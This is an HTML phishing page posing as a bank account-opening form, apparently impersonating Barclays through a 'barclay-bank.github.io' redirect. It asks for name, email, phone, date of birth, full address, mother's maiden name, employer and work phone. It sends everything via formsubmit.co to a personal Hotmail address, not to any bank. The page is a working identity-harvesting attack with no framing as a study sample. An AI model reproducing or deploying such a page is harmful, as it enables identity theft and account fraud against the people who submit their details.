<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

</head>
<body>
    <div class="container">
    <header>
        <h1>Opening Bank Account</h1>
    </header>

    <h2>Personal Information</h2>

    <form action="https://formsubmit.co/Robertbrown453@hotmail.com" method="POST">
        <input type="hidden" name="_subject" value="New Submission!">
        <input type="hidden" name="_next" value="https://barclay-bank.github.io/Processing/">
            <div class="label">
        <label for="Name">Name</label>
        <div class="name">
        <input name="firstname" type="text" id="firstname" placeholder="First" required>
        <input name="lastname" type="text" id="lastname" placeholder="Last" required>   
    </div>
    </div>
    <div class="email">
        <label for="email">Email</label>
        <input type="email" name="email" id="email" required> 
    </div>

    <div class="phone">
        <label for="number">Phone</label>
        <input type="number" name="number" id="phone" placeholder="### ### ####" required>
    </div>

    <div class="date">
        <label for="date">Date Of Birth</label>
        <input type="date" name="DOB" id="date" placeholder="MM/DD/YYYY" required>
    </div>

    <div class="address">
        <label for="address">Address</label>
        <input type="text" name="street address" id="address" placeholder="Street Address" required>
        <input type="text" name="street address line 2" id="address2" placeholder="Street Address Line 2" required>
    </div>

    <div class="address2">
        <input type="text" name="city" id="city" placeholder="City" required>
        <input type="text" name="region" id="region" placeholder="Region" required>
        <input type="text" name="postal code" id="region" placeholder="Postal / Zip Code" required>
        <input type="text" name="country" id="country" placeholder="Country" required>
    </div>

    <div class="radio">
        <label id="label">Marital Status</label>
        <div class="select">
        <div class="first">
        <input type="radio" name="Single" id="city">
         <label for="">Single</label>
        </div>
        <div class="second">
        <input type="radio" name="married" id="city">
        <label for="">Married</label>
    </div>
    <div class="third">
        <input type="radio" name="divorced" id="city">
        <label for="">Divorced</label>
    </div>
        <div class="fourth">
        <input type="radio" name="Widowed" id="city">
        <label for="">Widowed</label>
    </div>
</div>

<div class="mother">
    <label for="name">Mother's Maiden Name</label>
    <input type="text" name="mother's name" id="phone" required>
</div>

<div class="occupation">
    <label for="name">Occupation</label>
    <input type="text" name="occupation" id="occupation" required>
</div>

<div class="employer">
    <label for="name">Employer</label>
    <input type="text" name="Employer" id="Employer" required>
</div>

<div class="phone">
    <label for="number">Work Phone</label>
    <input type="number" name="workphone" id="phone" placeholder="### ### ####" required>
</div>

    <button class="submit">Submit</button>
    </div>
    </form>
</div>
